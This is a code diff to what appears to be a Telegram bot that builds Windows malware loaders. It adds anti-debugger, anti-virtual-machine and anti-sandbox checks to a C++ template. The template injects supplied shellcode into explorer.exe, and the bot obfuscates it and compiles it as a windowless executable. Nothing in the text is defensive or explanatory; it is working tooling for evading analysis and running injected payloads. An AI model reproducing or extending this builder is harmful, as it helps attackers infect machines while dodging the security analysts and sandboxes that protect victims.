@@ -423,6 +423,9 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
 #include <string>
 #include <tlhelp32.h>
 #include <stdlib.h>
+#include "anti_debug.h"
+#include "anti_sandbox.h"
+#include "anti_vm.h"
 
 {startup_macro}
 
@@ -499,6 +502,10 @@ DWORD FindTargetProcess(const std::string& processName) {{
 }}
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
+    if (CheckForDebugger() || AntiVM::isVM() || AntiSandbox::check_cpuid() || AntiSandbox::check_timing() || AntiSandbox::check_ram() || AntiSandbox::check_mac_address() || AntiSandbox::check_hardware_names() || AntiSandbox::check_linux_artifacts() || AntiSandbox::check_registry_keys() || AntiSandbox::check_vm_files() || AntiSandbox::check_running_processes()) {{
+        return 1;
+    }}
+
     char shellcode[] = "{shellcode_hex}";
 
     DWORD pid = FindTargetProcess("explorer.exe");
@@ -562,7 +569,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         # Compile the obfuscated C++ file
         await edit_message(query, "Compiling your file...", None)
         compile_result = subprocess.run(
-            ["g++", obfuscated_cpp_path, "-o", compiled_exe_path, "-mwindows", "-s", "-w", "-lshlwapi"],
+            ["g++", obfuscated_cpp_path, "-o", compiled_exe_path, "-mwindows", "-s", "-w", "-lshlwapi", "-Iincludes"],
             capture_output=True, text=True,
         )
 
